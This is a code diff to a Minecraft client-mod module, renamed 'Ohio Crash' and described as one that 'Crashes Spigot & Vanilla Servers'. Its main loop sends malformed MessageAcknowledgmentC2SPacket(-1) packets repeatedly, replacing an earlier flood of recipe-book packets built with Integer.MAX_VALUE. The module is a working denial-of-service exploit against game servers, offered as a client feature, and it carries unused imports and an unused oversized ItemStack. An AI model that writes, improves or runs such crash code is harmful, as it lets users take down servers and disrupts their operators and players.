@@ -10,14 +10,24 @@ import meteordevelopment.meteorclient.settings.SettingGroup;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
+import net.minecraft.item.ItemStack;
+import net.minecraft.item.Items;
+import net.minecraft.network.packet.c2s.common.CommonPongC2SPacket;
+import net.minecraft.network.packet.c2s.common.CookieResponseC2SPacket;
+import net.minecraft.network.packet.c2s.common.ResourcePackStatusC2SPacket;
+import net.minecraft.network.packet.c2s.login.LoginKeyC2SPacket;
 import net.minecraft.network.packet.c2s.play.*;
+import net.minecraft.network.packet.c2s.query.QueryPingC2SPacket;
 import net.minecraft.recipe.NetworkRecipeId;
+import net.minecraft.util.math.BlockPos;
 
-public class DevCrash extends Module {
-    public DevCrash() {
-        super(Main.CRASH_GROUP, "Spigot Crash", "dev shit");
+import java.util.UUID;
+
+public class OhioCrash extends Module {
+    public OhioCrash() {
+        super(Main.CRASH_GROUP, "Ohio Crash", "Crashes Spigot & Vanilla Servers");
     }
-    private final SettingGroup sg = settings.createGroup("spigot");
+    private final SettingGroup sg = settings.createGroup("recipe");
     private final Setting<Boolean> disableOnLeave = sg.add(new BoolSetting.Builder()
         .name("disable-on-leave")
         .description("Disables spam when you leave a server.")
@@ -48,8 +58,8 @@ public class DevCrash extends Module {
         ClientPlayNetworkHandler handler = mc.getNetworkHandler();
 
         for (int i = 0; i < buffer.get(); i++) {
-            NetworkRecipeId ohio = new NetworkRecipeId(Integer.MAX_VALUE);
-            handler.sendPacket(new RecipeBookDataC2SPacket(ohio));
+            ItemStack ohio = new ItemStack(Items.DIAMOND, Integer.MAX_VALUE);
+            handler.sendPacket(new MessageAcknowledgmentC2SPacket(-1));
         }
     }
 
